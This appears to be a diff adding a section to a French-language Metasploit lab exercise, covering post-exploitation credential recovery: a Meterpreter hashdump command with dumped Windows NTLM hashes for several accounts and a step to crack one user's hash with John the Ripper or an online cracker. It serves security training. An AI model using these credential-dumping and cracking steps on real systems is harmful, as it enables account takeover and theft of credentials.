@@ -360,3 +360,17 @@ Process List
 - Migrer l'interpreteur vers le processus winlogon.exe pour plus de stabilité
  (utiliser la commande MIGRATE)
  Quel était le processus vérolé par l'interpreteur avant migration ? 
+
+# Post-exploit : Récupération de crédentiels en mémoire
+
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+ 
+ - Récupérer le 2ème hash de Jon et essayer de le reverser avec crakstation.com ou l'utilitaire John the Ripper sur Kali
+
+ 
+ 
